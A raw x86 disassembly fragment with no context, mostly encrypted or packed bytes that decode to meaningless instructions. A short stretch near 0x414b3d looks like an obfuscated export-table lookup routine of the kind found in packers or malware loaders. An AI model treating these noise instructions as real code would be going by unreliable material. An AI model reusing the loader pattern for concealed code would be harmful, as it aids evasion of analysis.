  414a8b:	aaa    
  414a8c:	bswap  edx
  414a8e:	mov    ebx,0xed09f532
  414a93:	retf   
  414a94:	test   DWORD PTR [edi],esp
  414a96:	push   cs
  414a97:	jb     0x414a4b
  414a99:	aas    
  414a9a:	xchg   ebx,eax
  414a9b:	in     eax,0x8
  414a9d:	push   ebp
  414a9e:	xor    eax,0x8b5634a4
  414aa3:	iret   
  414aa4:	sbb    eax,0x572e316
  414aa9:	mov    ds:0xa554cfbc,al
  414aae:	jp     0x414ac4
  414ab0:	out    0x3a,eax
  414ab2:	push   es
  414ab3:	push   esp
  414ab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ab5:	adc    esp,DWORD PTR [ebx+0x7c]
  414ab8:	rol    DWORD PTR [ecx+eax*4-0x8c430a6],0xd8
  414ac0:	or     edx,DWORD PTR [edi+eax*1]
  414ac3:	imul   ebp,ebx,0x9240be28
  414ac9:	inc    esi
  414aca:	(bad)  
  414acb:	out    dx,eax
  414acc:	mov    ?,WORD PTR [eax+0x57d9a640]
  414ad2:	lahf   
  414ad3:	shl    ch,cl
  414ad5:	inc    edi
  414ad6:	test   eax,0x7ebba50f
  414adb:	xchg   ah,al
  414add:	push   es
  414ade:	sbb    ecx,esi
  414ae0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ae1:	icebp  
  414ae2:	cmc    
  414ae3:	sar    DWORD PTR [eax],cl
  414ae5:	push   ss
  414ae6:	lods   al,BYTE PTR ds:[esi]
  414ae7:	outs   dx,BYTE PTR ds:[esi]
  414ae8:	mov    bh,0x79
  414aea:	test   eax,0x554da281
  414aef:	push   ebx
  414af0:	push   ds
  414af1:	sub    DWORD PTR [edx-0x6b],esp
  414af4:	loope  0x414aa9
  414af6:	mov    edx,0xc8369162
  414afb:	mov    ah,0x34
  414afd:	xchg   esp,eax
  414afe:	repnz in eax,dx
  414b00:	aaa    
  414b01:	push   esi
  414b02:	add    cl,BYTE PTR [edi]
  414b04:	sar    DWORD PTR [eiz*1+0x4a259ebf],cl
  414b0b:	das    
  414b0c:	js     0x414b2c
  414b0e:	and    eax,0x32264945
  414b13:	xor    BYTE PTR [esi+0x2e],al
  414b16:	xchg   ebx,eax
  414b17:	jns    0x414ac5
  414b19:	mov    al,ds:0x64408dd3
  414b1e:	fwait
  414b1f:	mov    DWORD PTR [ebx+0x229442dc],esi
  414b25:	int3   
  414b26:	jns    0x414b5b
  414b28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b29:	loope  0x414ae6
  414b2b:	out    0x2b,al
  414b2d:	(bad)  
  414b2e:	sbb    ecx,esp
  414b30:	fwait
  414b31:	rcr    BYTE PTR [edi-0x37c43cfd],1
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	shl    DWORD PTR [esi+0x7b5b1cd3],0x7f
  414bbd:	jo     0x414b78
  414bbf:	jle    0x414c31
  414bc1:	jo     0x414b7d
  414bc3:	dec    edx
  414bc4:	in     al,dx
  414bc5:	push   ebx
  414bc6:	in     eax,0xf2
  414bc8:	jmp    0x414bc2
  414bca:	shr    BYTE PTR [ecx],1
  414bcc:	imul   ecx,DWORD PTR [eax+0x2a],0xffffff9c
  414bd0:	std    
  414bd1:	inc    esp
  414bd2:	dec    eax
  414bd3:	inc    esp
  414bd4:	xchg   edi,eax
  414bd5:	xchg   esp,eax
  414bd6:	fsub   DWORD PTR [edi]
  414bd8:	enter  0x7a89,0xfa
  414bdc:	inc    esp
  414bdd:	sbb    DWORD PTR [ecx],esp
  414bdf:	xor    edi,DWORD PTR [esi+0x60637f4d]
  414be5:	and    ebp,eax
  414be7:	pop    edx
  414be8:	sti    
  414be9:	cmovle edi,DWORD PTR [eax+0x12]
  414bed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bee:	xor    cl,BYTE PTR [eax-0x470d57fd]
  414bf4:	pop    eax
  414bf5:	sbb    DWORD PTR [ebx+0x5a],ebx
  414bf8:	push   ds
  414bf9:	adc    al,0xd4
  414bfb:	sub    BYTE PTR [edi],al
  414bfd:	or     ecx,DWORD PTR [eax]
  414bff:	cwde   
  414c00:	pop    eax
  414c01:	and    BYTE PTR [ebp-0x2989c07b],0xdc
  414c08:	stos   DWORD PTR es:[edi],eax
  414c09:	into   
  414c0a:	jmp    0x414b97
  414c0c:	adc    BYTE PTR [edi-0x112926d],0x23
  414c13:	lock cld 
  414c15:	jg     0x414c00
  414c17:	out    dx,al
  414c18:	int3   
  414c19:	ss inc esi
  414c1b:	std    
  414c1c:	int    0xa6
  414c1e:	je     0x414c2b
  414c20:	shr    ah,cl
  414c22:	xor    ch,al
  414c24:	jno    0x414be3
  414c26:	jg     0x414c93
  414c28:	or     DWORD PTR [edi+0x69],edi
  414c2b:	adc    DWORD PTR [edx-0x52],0xffffffef
  414c2f:	loopne 0x414c2d
  414c31:	stos   DWORD PTR es:[edi],eax
  414c32:	sti    
  414c33:	(bad)  [edx-0x7e46edd2]
  414c39:	mov    al,ds:0xe8a71020
  414c3e:	not    BYTE PTR [eax+0x14658b90]
  414c44:	les    esp,FWORD PTR es:0x961d2257
  414c4b:	call   0xd083:0x6a560932
  414c52:	retf   0x1bfb
  414c55:	push   edi
  414c56:	mov    BYTE PTR [ebp+0x54],cl
  414c59:	ret    
  414c5a:	ror    BYTE PTR [edi+0x1a],1
  414c5d:	(bad)  [eax-0x62]
  414c60:	xor    eax,0x8c6b494c
  414c65:	dec    ebp
  414c66:	pop    esp
  414c67:	test   ah,bl
  414c69:	(bad)  
  414c6b:	jns    0x414ca9
  414c6d:	sahf   
  414c6e:	jge    0x414c6a
  414c70:	xchg   BYTE PTR [ebx+0x4d],bh
  414c73:	adc    al,0x95
  414c75:	jl     0x414c26
  414c77:	inc    eax
  414c78:	add    BYTE PTR [ebx-0x703f8215],cl
  414c7e:	sbb    al,0x0
  414c80:	xlat   BYTE PTR ds:[ebx]
  414c81:	jmp    0xf1a9:0x4d6a3c27
  414c88:	mov    edi,0x4e0064e
  414c8d:	in     al,dx
  414c8e:	xor    eax,0xfd43dfa5
  414c93:	pop    edi
  414c94:	or     dh,bl
  414c96:	icebp  
  414c97:	jmp    0x9b36d5db
  414c9c:	push   0x9631ac82
  414ca1:	imul   ebp,eax,0xef2fe260
  414ca7:	push   ebx
  414ca8:	inc    edx
  414ca9:	or     BYTE PTR ds:0xe8ef7092,cl
  414caf:	(bad)  
  414cb0:	jge    0x414c4f
  414cb2:	sbb    eax,DWORD PTR [edi]
  414cb4:	jb     0x414c62
  414cb6:	das    
  414cb7:	gs push ebp
  414cb9:	cs jle 0x414c4e
  414cbc:	mov    ds:0xc525f40e,eax
  414cc1:	pop    es
  414cc2:	in     eax,dx
  414cc3:	enter  0x61e4,0x7c
  414cc7:	fnsave [eax-0x7a]
  414cca:	mov    edx,0x66a28166
  414ccf:	mov    ch,0xdf
  414cd1:	mov    DWORD PTR [esi+0x1f],eax
  414cd4:	cmp    DWORD PTR [edx],esp
  414cd6:	in     eax,dx
  414cd7:	xchg   esp,eax
  414cd8:	je     0x414ce0
  414cda:	retf   0x70de
  414cdd:	sbb    cl,BYTE PTR [edi-0x732c7bd]
  414ce3:	mov    esi,0xac23fd15
  414ce8:	(bad)  
  414ce9:	cli    
  414cea:	and    al,0xb9
  414cec:	mov    eax,0xf8689b3f
  414cf1:	test   BYTE PTR [ebp+esi*1+0x651e8f1f],ch
  414cf8:	bound  ebx,QWORD PTR [ecx-0x6a593089]
  414cfe:	xchg   esp,eax
  414cff:	nop
  414d00:	std    
  414d01:	shl    BYTE PTR [edx],0xdb
  414d04:	lods   al,BYTE PTR ds:[esi]
  414d05:	sbb    eax,0x24442eb4
  414d0a:	loop   0x414c9c
  414d0c:	jmp    0xf385:0xfcab060c
  414d13:	xor    al,0x6
  414d15:	scas   al,BYTE PTR es:[edi]
  414d16:	dec    ebp
  414d17:	dec    esp
  414d18:	cmp    BYTE PTR [ebp+esi*8-0x21898251],ch
  414d1f:	nop
  414d20:	pop    edx
  414d21:	sbb    ebx,DWORD PTR [esi+0x28]
  414d24:	or     bl,cl
  414d26:	mov    bl,0xa5
  414d28:	ret    0xf500
  414d2b:	add    DWORD PTR [edi-0x6e],ecx
  414d2e:	sub    DWORD PTR [ecx],0x293496b9
  414d34:	or     BYTE PTR [ebp+0xa],dh
  414d37:	add    DWORD PTR [eax+0x3d341f43],0x1119659a
  414d41:	mov    DWORD PTR [eax+0x68],ecx
  414d44:	leave  
  414d45:	imul   edi,DWORD PTR [esi+0x57205e45],0x58623fd8
  414d4f:	or     BYTE PTR [eax],bl
  414d51:	sahf   
  414d52:	icebp  
  414d53:	jecxz  0x414d17
  414d55:	(bad)  
  414d57:	inc    eax
  414d58:	ret    
  414d59:	sub    edx,ebp
  414d5b:	daa    
  414d5c:	in     al,dx
  414d5d:	outs   dx,BYTE PTR ds:[esi]
  414d5e:	and    edi,ebx
  414d60:	ror    BYTE PTR ds:0x8c6a4e4b,0xbe
  414d67:	jl     0x414d2e
  414d69:	jl     0x414d19
  414d6b:	jne    0x414de9
  414d6d:	in     al,dx
  414d6e:	(bad)  
  414d6f:	jmp    0x414d82
  414d71:	push   esp
  414d72:	xchg   ebx,eax
  414d73:	cs hlt 
  414d75:	mov    esp,0x242da0c1
  414d7a:	or     al,0x1f
  414d7c:	ficomp DWORD PTR [si+0x5a]
  414d80:	jne    0x414d11
  414d82:	je     0x414d82
  414d84:	into   
  414d85:	push   esp
  414d86:	jle    0x414d1a
  414d88:	fidivr WORD PTR [ecx+0x9]
  414d8b:	lock fisubr WORD PTR [esi]
  414d8e:	pusha  
  414d8f:	pop    ecx
  414d90:	sbb    bl,bl
  414d92:	dec    ebp
  414d93:	mov    esi,0x8db07972
  414d98:	mov    edi,0x1d4be62b
  414d9d:	mov    bh,0xfa
  414d9f:	sbb    cl,bh
  414da1:	(bad)  
  414da2:	mov    ch,BYTE PTR [edx+0x44b15724]
  414da8:	int3   
  414da9:	mov    al,ah
  414dab:	fst    QWORD PTR [esi+0x43]
  414dae:	icebp  
  414daf:	cmp    eax,0xa47ad131
  414db4:	sub    eax,0x4ae7571
  414db9:	jmp    0xc2e8:0x78049d91
  414dc0:	fistp  WORD PTR [ebx-0x22]
  414dc3:	out    dx,eax
  414dc4:	jl     0x414daf
  414dc6:	scas   eax,DWORD PTR es:[edi]
  414dc7:	pop    esi
  414dc8:	pop    eax
  414dc9:	dec    edi
  414dca:	or     BYTE PTR [esi+0x5c],bh
  414dcd:	mov    ebx,0xd31d0a97
  414dd2:	xchg   ecx,eax
  414dd3:	shl    DWORD PTR [ebx],cl
  414dd5:	loope  0x414dde
  414dd7:	or     al,0xd5
  414dd9:	jg     0x414e07
  414ddb:	push   es
  414ddc:	mov    dh,0x7
  414dde:	jmp    0x414db4
  414de0:	mov    bl,0x0
  414de2:	mul    DWORD PTR [esi]
  414de4:	inc    esp
  414de5:	pop    es
  414de6:	loop   0x414e4b
  414de8:	or     al,BYTE PTR [eax+0x1125aff2]
  414dee:	mov    ds:0x12140fcb,al
  414df3:	in     eax,0x21
  414df5:	sti    
  414df6:	aas    
  414df7:	adc    al,0xe
  414df9:	(bad)  
  414dfa:	(bad)  
  414dfb:	and    BYTE PTR [eax],ch
  414dfd:	int3   
  414dfe:	mov    bl,0xba
  414e00:	pop    ecx
  414e01:	test   DWORD PTR [eax+0x5a],ecx
  414e04:	push   0x37c2c2e8
  414e09:	call   0x8f03a3e3
  414e0e:	cdq    
  414e0f:	or     DWORD PTR [ecx+0x69],ebp
  414e12:	mov    ds:0x2e0353b0,eax
  414e17:	mov    al,ds:0xa5e3abd0
  414e1c:	out    0x5f,eax
  414e1e:	cs adc ebx,esi
  414e21:	and    BYTE PTR [ecx],ah
  414e23:	mov    esi,0x180628eb
  414e28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e29:	test   DWORD PTR [esi],ebp
  414e2b:	sub    cl,bl
  414e2d:	popf   
  414e2e:	mov    ebx,0xb1011c56
  414e33:	fisttp DWORD PTR [esi-0x74]
  414e36:	xchg   ebx,eax
  414e37:	dec    edx
  414e38:	popf   
  414e39:	(bad)  [edx+0x28cf3713]
  414e3f:	pop    esp
  414e40:	add    DWORD PTR [ecx],eax
  414e42:	mov    eax,ds:0xbe3d896a
  414e47:	adc    bl,BYTE PTR [edi+0x14]
  414e4a:	lock call 0xc1184dfb
  414e50:	jmp    0xe8454d8b
  414e55:	xchg   DWORD PTR [ebx+eax*4-0x1ed40a52],esp
  414e5c:	rcl    ecx,1
  414e5e:	xor    ecx,edi
  414e60:	sbb    al,0x1d
  414e62:	scas   al,BYTE PTR es:[edi]
  414e63:	mov    al,0x79
  414e65:	test   eax,0xda2930a1
  414e6a:	loopne 0x414ecc
  414e6c:	ret    
  414e6d:	jmp    0x7e311d51
  414e72:	(bad)  
  414e73:	jb     0x414e5c
  414e75:	loope  0x414e7e
  414e77:	push   ds
  414e78:	leave  
  414e79:	test   BYTE PTR [esi-0x7],al
  414e7c:	push   edi
  414e7d:	in     al,0x1b
  414e7f:	fst    DWORD PTR [esi-0x329522de]
  414e85:	test   BYTE PTR [edi+0x6a59b409],ch
  414e8b:	add    eax,0xcb875b49
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	mov    edi,0xa4890caa
  414eb1:	js     0x414f32
  414eb3:	jo     0x414e6e
  414eb5:	jle    0x414f27
  414eb7:	jo     0x414ebb
  414eb9:	adc    eax,0x75d75447
  414ebe:	dec    edi
  414ebf:	sbb    DWORD PTR [ebx+0x7c6c51f8],esi
  414ec5:	pop    esp
  414ec6:	ins    DWORD PTR es:[edi],dx
  414ec7:	or     ebx,eax
  414ec9:	rcl    DWORD PTR [ecx-0x6c],1
  414ecc:	xor    eax,0x109e0604
  414ed1:	inc    esi
  414ed2:	js     0x414f45
  414ed4:	xor    DWORD PTR [edi],ebp
  414ed6:	or     BYTE PTR [esi-0x42],ah
  414ed9:	mov    esp,0xf546b334
  414ede:	jmp    0x7994:0xb2ea2bbf
  414ee5:	sar    BYTE PTR [ebx],1
  414ee7:	ficomp DWORD PTR [edx+0x3513c03a]
  414eed:	or     eax,0x25a7034a
  414ef2:	pop    ebx
  414ef3:	mov    al,0xff
  414ef5:	push   edi
  414ef6:	dec    eax
  414ef7:	jg     0x414f1c
  414ef9:	sub    ch,BYTE PTR [ebx+0x3f]
  414efc:	adc    eax,0x4a2c4f1e
  414f01:	xchg   edx,eax
  414f02:	call   0xdc84ffd
  414f07:	cmp    bl,BYTE PTR [edi+0x55af4645]
  414f0d:	sub    DWORD PTR ds:0x1ad2f067,0x4ee00722
  414f17:	add    DWORD PTR [ebx+0x42],edx
  414f1a:	xor    ebx,edi
  414f1c:	clc    
  414f1d:	or     DWORD PTR [ebx],0xb340f5d6
  414f23:	mov    edi,0x82c10983
  414f28:	sub    BYTE PTR [esp+ecx*2-0x62],ch
  414f2c:	pop    cx
  414f2e:	push   edx
  414f2f:	inc    edx
  414f30:	lock fsub DWORD PTR [edx-0x4fc7f918]
  414f37:	cmp    eax,0xec277147
  414f3c:	sbb    BYTE PTR [ecx],bl
  414f3e:	mov    ch,0x79
  414f40:	jp     0x414f84
  414f42:	xchg   DWORD PTR [ecx-0x52cc83f7],eax
  414f48:	stos   DWORD PTR es:[edi],eax
  414f49:	mov    edx,DWORD PTR [bx+0x4a]
  414f4d:	dec    eax
  414f4e:	jae    0x414f09
  414f50:	adc    eax,0x5a80ebad
  414f55:	mov    esi,0xfdab049a
  414f5a:	add    al,0x38
  414f5c:	pop    es
  414f5d:	xlat   BYTE PTR ds:[ebx]
  414f5e:	stos   DWORD PTR es:[edi],eax
  414f5f:	xchg   esi,eax
  414f60:	xchg   edx,eax
  414f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f62:	shl    BYTE PTR [eax-0x77],cl
  414f65:	(bad)  
  414f66:	cld    
  414f67:	ret    0xc17
  414f6a:	aam    0x46
  414f6c:	push   0x8ba914a7
  414f71:	push   edi
  414f72:	sub    esp,DWORD PTR [esi-0x5ba4a2a6]
  414f78:	mov    ebp,0xc4da9b54
  414f7d:	add    ecx,ebp
  414f7f:	mov    bl,0x94
  414f81:	rol    DWORD PTR ds:0xc69008ce,0x34
  414f88:	test   al,0xd7
  414f8a:	jo     0x414f40
  414f8c:	jo     0x414f57
  414f8e:	lods   eax,DWORD PTR ds:[esi]
  414f8f:	fmul   st(7),st
  414f91:	jne    0x414ff5
  414f93:	mov    edi,?
  414f95:	dec    esi
  414f96:	test   al,0x15
  414f98:	je     0x414f66
  414f9a:	jl     0x414f96
  414f9c:	test   al,0x74
  414f9e:	ror    DWORD PTR [eax],cl
  414fa0:	xchg   edi,eax
  414fa1:	mov    esp,0x232f88b
  414fa6:	dec    edi
  414fa7:	cmp    bl,al
  414fa9:	popa   
  414faa:	or     DWORD PTR [esi],0x4
  414fad:	dec    esi
  414fae:	or     DWORD PTR [esi-0x208aeee9],edi
  414fb4:	jae    0x414f93
  414fb6:	ror    edx,cl
  414fb8:	shl    DWORD PTR [esi-0x5f],cl
  414fbb:	mov    dl,0x90
  414fbd:	or     BYTE PTR [edx-0x11],bh
  414fc0:	arpl   WORD PTR ds:0xb3a442df,cx
  414fc6:	push   cs
  414fc7:	xchg   BYTE PTR [ebp-0x47],al
  414fca:	cmp    DWORD PTR [edi],0x1b
  414fcd:	cmp    dl,0x7d
  414fd0:	pushf  
  414fd1:	cli    
  414fd2:	in     al,dx
  414fd3:	(bad)  
  414fd4:	jae    0x414fdd
  414fd6:	shr    DWORD PTR [esi-0x3f705fe1],cl
  414fdc:	push   esi
  414fdd:	out    0x15,eax
  414fdf:	jmp    0x4cc1:0x29d65e4a
  414fe6:	jmp    0x72a:0x5b6e82d4
  414fed:	or     DWORD PTR [ecx+0x32],ebx
  414ff0:	push   edx
  414ff1:	xchg   ecx,eax
  414ff2:	arpl   WORD PTR [ebx+0x723bec0a],bp
  414ff8:	sbb    DWORD PTR [edi],0x4a
  414ffb:	inc    ebp
  414ffc:	pop    ss
  414ffd:	pop    ebx
  414ffe:	imul   edx,DWORD PTR [ecx],0x8405c2c0
  415004:	jge    0x414fbd
  415006:	add    edx,ebp
  415008:	and    ecx,0xd5c597ea
  41500e:	aam    0x6c
  415010:	adc    ebp,edi
  415012:	(bad)  
  415013:	and    BYTE PTR [edx+0x42],dh
  415016:	in     eax,0x27
  415018:	add    eax,0x27eb343f
  41501d:	push   edx
  41501e:	add    eax,0xc4df1ae4
  415023:	call   0x80ed:0x666ce903
  41502a:	sub    al,0x91
  41502c:	jecxz  0x41507e
  41502e:	push   cs
  41502f:	xlat   BYTE PTR ds:[ebx]
  415030:	cwde   
  415031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415032:	test   BYTE PTR [ebp-0x670676a4],dl
  415038:	push   esp
  415039:	sub    dl,al
  41503b:	aaa    
  41503c:	sbb    DWORD PTR ds:0x1019a56d,esp
  415042:	jo     0x415019
  415044:	sub    BYTE PTR [ebp-0x24],al
  415047:	icebp  
  415048:	out    0xd,al
  41504a:	stc    
  41504b:	push   ebx
  41504c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41504d:	add    al,0x18
  41504f:	or     BYTE PTR [ebx],0x14
  415052:	fsub   QWORD PTR [ebx]
  415054:	jmp    FWORD PTR [edi+eax*1]
  415057:	popa   
  415058:	mov    eax,ds:0x9c1f6210
  41505d:	jae    0x414ff3
  41505f:	push   0xffffffbe
  415061:	faddp  st(7),st
  415063:	jg     0x415045
  415065:	mov    bl,0xdc
  415067:	or     eax,0x38cf5daf
  41506c:	jo     0x415084
  41506e:	adc    ebp,esi
  415070:	push   edx
  415071:	adc    BYTE PTR [esi+eiz*2-0x6e],dl
  415075:	sahf   
  415076:	and    eax,DWORD PTR [esi+0x10]
  415079:	xor    eax,0x4d02e95
  41507e:	adc    al,0xed
  415080:	fsub   st,st(7)
  415082:	shr    edx,cl
  415084:	ficomp WORD PTR [ecx]
  415086:	ds push es
  415088:	out    dx,eax
  415089:	sub    dh,BYTE PTR [ecx-0x3f]
  41508c:	push   edi
  41508d:	lds    ecx,FWORD PTR [eax+0x59]
  415090:	(bad)  
  415091:	push   edi
  415092:	dec    ebx
  415093:	pop    es
  415094:	aad    0x72
  415096:	dec    esi
  415097:	aam    0x18
  415099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41509a:	cwde   
  41509b:	in     al,dx
  41509c:	not    DWORD PTR [edi+ebp*1]
  41509f:	mov    ds:0x87e17592,eax
  4150a4:	fsubrp st(3),st
  4150a6:	(bad)  
  4150a7:	not    BYTE PTR [edi+0x58]
  4150aa:	ins    BYTE PTR es:[edi],dx
  4150ab:	add    edx,eax
  4150ad:	ret    
  4150ae:	dec    eax
  4150af:	popa   
  4150b0:	and    BYTE PTR [edx],al
  4150b2:	imul   ecx,DWORD PTR [esi],0x45feb02
  4150b8:	mov    eax,0x7173fd0c
  4150bd:	ja     0x415129
  4150bf:	xor    DWORD PTR [edx-0x3f],0xffffffa8
  4150c3:	and    dh,BYTE PTR [ebp+0x7fd7887f]
  4150c9:	pop    eax
  4150ca:	add    eax,0xafaac3e1
  4150cf:	cmp    ebp,DWORD PTR [edx-0x531d1432]
  4150d5:	inc    ebp
  4150d6:	push   edi
  4150d7:	dec    eax
  4150d8:	sbb    al,0x76
  4150da:	and    DWORD PTR [edx],edx
  4150dc:	sub    al,0xb7
  4150de:	(bad)  
  4150df:	es cmp al,0x59
  4150e3:	das    
  4150e4:	pop    ecx
  4150e5:	in     eax,dx
  4150e6:	sbb    dl,dh
  4150e8:	or     BYTE PTR [edi],dh
  4150ea:	jmp    0x41507c
  4150ec:	loope  0x4150fe
  4150ee:	arpl   bp,sp
  4150f0:	mov    esi,0x1d5cab35
  4150f5:	nop
  4150f6:	setg   BYTE PTR [eax-0x2c]
  4150fa:	dec    edx
  4150fb:	clc    
  4150fc:	sub    al,0x5b
  4150fe:	xor    dl,BYTE PTR [ebx+0x28d92686]
  415104:	repnz bound esp,QWORD PTR [edx-0x4841bb34]
  41510b:	in     eax,dx
  41510c:	jmp    DWORD PTR [ebx-0x2f]
  41510f:	les    edi,FWORD PTR [eax+0x37]
  415112:	push   cs
  415113:	pop    ds
  415114:	cwde   
  415115:	xor    esp,DWORD PTR [esi-0x699ac963]
  41511b:	add    bh,BYTE PTR [eax-0xe]
  41511e:	mov    ebp,ds
  415120:	add    dl,BYTE PTR [ebx+0x28befe6e]
  415126:	lock call 0xe412:0xe43191bf
  41512e:	mul    DWORD PTR [edx]
  415130:	mov    ds:0x81308bcf,al
  415135:	sub    ebx,DWORD PTR [ecx]
  415137:	xchg   eax,eax
  415139:	dec    ebx
  41513a:	cld    
  41513b:	xchg   esp,eax
  41513c:	xchg   ebp,eax
  41513d:	xchg   ebx,eax
  41513e:	mov    ebp,0x4e46918d
  415143:	shr    BYTE PTR [edi-0x4d3cfbe2],1
  415149:	pop    ebx
  41514a:	loope  0x415128
  41514c:	mov    dh,0x24
  41514e:	mov    dh,bl
  415150:	(bad)  
  415151:	in     al,0x91
  415153:	(bad)  
  415154:	in     eax,0x31
  415156:	adc    BYTE PTR [esi],dl
  415158:	pop    ebp
  415159:	mov    bl,BYTE PTR [esp+ecx*8]
  41515c:	aas    
  41515d:	das    
  41515e:	xor    BYTE PTR [edi],cl
  415160:	pop    ebp
  415161:	xchg   edi,eax
  415162:	jmp    DWORD PTR [edx+0x19]
  415165:	popf   
  415166:	xor    eax,0x3613a9e4
  41516b:	jl     0x4150fd
  41516d:	lea    ebp,[esi+ecx*2+0xa]
  415171:	cmp    al,0xc7
  415173:	xchg   edx,eax
  415174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415175:	add    eax,0xe1b51cf
  41517a:	rcl    DWORD PTR ds:0x2bcdcc12,1
  415180:	loopne 0x41510b
  415182:	fmul   QWORD PTR gs:[ebx+0x55b9fc45]
  415189:	or     BYTE PTR [ecx+0x7],dl
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fprem1 
  4151a5:	push   ss
  4151a6:	adc    eax,0x7f05ed39
  4151ab:	jo     0x415166
  4151ad:	jle    0x41521f
  4151af:	jo     0x415148
  4151b1:	cld    
  4151b2:	(bad)  [ecx+0x40]
  4151b5:	sar    BYTE PTR [esi],0xb6
  4151b8:	jmp    0xa4ff:0xc1738567
  4151bf:	aam    0x63
  4151c1:	fldcw  WORD PTR [eax-0x44]
  4151c4:	push   esi
  4151c5:	add    esp,DWORD PTR ds:0xa6a9772c
  4151cb:	sub    al,0xa0
  4151cd:	adc    al,0xa4
  4151cf:	pop    eax
  4151d0:	dec    ebx
  4151d1:	add    eax,0x333ad260
  4151d6:	jno    0x41518a
  4151d8:	mov    cl,0xcf
  4151da:	pop    ebp
  4151db:	sub    BYTE PTR [edi],ah
  4151dd:	or     esi,ebx
  4151df:	test   DWORD PTR [edi+0x4811289d],eax
  4151e5:	inc    eax
  4151e6:	iret   
  4151e7:	mov    esp,0xcf133d0f
  4151ec:	jne    0x415221
  4151ee:	gs repz test eax,0xe757d357
  4151f5:	inc    ebp
  4151f6:	inc    ecx
  4151f7:	jae    0x41525b
  4151f9:	xor    al,0x8f
  4151fb:	data16 sub BYTE PTR [edx+edi*2+0x71],ch
  415200:	sbb    DWORD PTR [edi+0x1b5cd9da],0x45
  415207:	xchg   ecx,eax
  415208:	repnz cwde 
  41520a:	xchg   edi,eax
  41520b:	rcl    DWORD PTR gs:[ebp-0x4bdca60f],0x2f
  415213:	mov    al,ds:0x97a03958
  415218:	adc    ecx,DWORD PTR [ebx-0x32760d78]
  41521e:	cmp    BYTE PTR [ecx-0x26],0x2f
  415222:	jp     0x4151d4
  415224:	cmp    ch,BYTE PTR [edx]
  415226:	mov    ecx,0xaeabafc9
  41522b:	js     0x41529a
  41522d:	push   edx
  41522e:	int    0xf3
  415230:	sbb    DWORD PTR [ebp-0x432e793b],esp
  415236:	add    bh,dh
  415238:	fwait
  415239:	aad    0x98
  41523b:	ret    
  41523c:	retf   0xac11
  41523f:	adc    ebp,esp
  415241:	jae    0x415283
  415243:	or     BYTE PTR [edx],bl
  415245:	jg     0x4151cb
  415247:	jno    0x415292
  415249:	lea    ecx,ds:0x16542863
  41524f:	jno    0x41522a
  415251:	or     DWORD PTR [eax+0x7a61aba5],esi
  415257:	pop    edi
  415258:	xor    al,0xd7
  41525a:	and    ah,dh
  41525c:	inc    esp
  41525d:	cmc    
  41525e:	xchg   DWORD PTR [ebx-0x1f1977b5],edi
  415264:	xchg   esi,eax
  415265:	retf   
  415266:	retf   0xfdf0
  415269:	leave  
  41526a:	mov    ebx,eax
  41526c:	jns    0x41522f
  41526e:	pop    ebp
  41526f:	add    eax,0x55bfaa19
  415274:	fistp  DWORD PTR [ebp-0x63b84731]
  41527a:	int    0x39
  41527c:	ja     0x415259
  41527e:	xchg   ebx,eax
  41527f:	inc    esi
  415280:	enter  0xf72b,0xb2
  415284:	aaa    
  415285:	fiadd  DWORD PTR [ebx]
  415287:	xchg   esi,eax
  415288:	sar    bl,1
  41528a:	cmp    al,0x5c
  41528c:	dec    eax
  41528d:	jge    0x4152b2
  41528f:	cld    
  415290:	or     DWORD PTR [edi+0x6d5d9d67],edi
  415296:	dec    edi
  415297:	push   esp
  415298:	inc    edi
  415299:	lods   eax,DWORD PTR ds:[esi]
  41529a:	jmp    0x14122131
  41529f:	mov    ch,0x88
  4152a1:	and    eax,0xd2ba7208
  4152a6:	mov    edx,0x3062058b
  4152ab:	addr16 cdq 
